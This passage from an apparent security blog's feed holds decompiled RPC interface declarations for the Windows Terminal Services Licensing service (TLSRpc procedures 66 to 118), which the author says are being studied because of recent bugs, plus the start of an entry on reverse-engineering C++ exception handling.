function_">Proc66_TLSRpcLookupServerFixed</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_2,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_3,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc67_TLSRpcTriggerReGenKeyNoWarning</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc68_TLSRpcIssuePerUserLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_6)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc69_TLSRpcReportEnumBegin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc70_TLSRpcReportEnumNext</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc71_TLSRpcReportEnumEnd</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc72_TLSRpcFetchReportBegin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc73_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="comment">/*[range(0,16384)]*/</span> <span class="type">char</span> *arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc74_TLSRpcFetchReportEnd</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc75_TLSRpcReportGenerateBegin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_4,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc76_TLSRpcReportGenerateCancel</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc77_TLSRpcReportDelete</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc78_TLSRpcIsFreeKeyPackInstalled</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc79_TLSRpcIsServerInDomain</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc80_TLSRpcRevokeLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_4,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc81_TLSRpcIsLSPublished</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc82_TLSRpcPublishLS</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc83_TLSRpcUnpublishLS</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc84_TLSRpcChangeRole</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc85_TLSRpcIsGPEnabled</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc86_TLSRpcLocalGroupForGPPresent</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc87_TLSRpcCreateLocalGroupForGP</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc88_TLSRpcRemoveLocalGroupForGP</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc89_TLSRpcCanLSUpdateAD</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc90_TLSRpcAddLStoTSLSofDC</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc91_TLSRpcRemoveLSFromTSLSOfAD</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc92_TLSRpcIsLSonDC</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc93_TLSRpcDatabasePath</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,512)]*/</span>  <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,512)] */</span><span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc94_TLSRpcIsUserAdmin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc95_TLSRpcIsPreventUpgGPEnabled</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc96_TLSRpcUpgradeLicenseWithMarkExEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_4)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_9,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_10,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_11,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_12)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc97_TLSRpcRegisterToSCP</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc98_TLSRpcUnRegisterFromSCP</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc99_TLSRpcIsSCPRegistered</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc100_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="comment">/*[range(0,16384)]*/</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc101_TLSRpcRegisterLicenseKeyPackEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_2)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_4)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_5,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_7,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_8)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc102_TLSRpcTelephoneRegisterLKPEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc103_TLSRpcUnRegisterLicenses</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc104_TLSRpcGetOSVersion</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc105_TLSRpcLogEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc106_TLSRpcUpgradeLicenseV4</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_4)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_9,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_10,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_11,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>][size_is(<span class="number">33</span>)]<span class="comment">/*[range(0,0)]*/</span>  <span class="type">wchar_t</span>* arg_12,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_13)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc107_TLSRequestNewLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_9,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_10,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_11,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_12,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_13,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_14)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc108_TLSRpcGetCHIDsForSupportedCALs</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out][ref] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,16384)]*/</span>  <span class="comment">/*  */</span>[<span class="built_in">string</span>] <span class="type">wchar_t</span>*** arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc109_TLSRpcGetCHIDsForSupportedCALsDelimited</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc110_TLSRpcGetSupportedFeatures</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc111_TLSRpcFetchReportNextEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,16384)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc112_TLSRpcFetchReportCALInfoNextEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,16384)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc113_TLSRpcConvertLicenses</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc114_TLSRpcFetchReportEntriesDetail</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="comment">/*[range(0,16384)]*/</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc115_TLSRpcFetchReportFailedPUSummaryEntries</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,16384)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc116_TLSRpcFetchReportNext_PD</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,16384)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,16384)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span> * arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc117_TLSRpcIssuePerUserLicenseEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_3)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_4,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_6,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_7,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_8,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_9,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_10,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_11)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc118_TLSRpcConfigHighAvailability</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>]<span class="comment">/*[range(0,0)]*/</span>  <span class="type">wchar_t</span>** arg_3,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;鉴于该服务近期出了好几个bug, 学习一下该服务的几个例子.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>C++ 异常处理的逆向</title>
    <link href="http://474172261.github.io/2024/04/02/CPlusPlus_Exception/"/>
    <id>http://474172261.github.io/2024/04/02/CPlusPlus_Exception/</id>
    <published>2024-04-02T08:56:52.718Z</published>
    <updated>2024-08-23T05:52:21.083Z</updated>
    
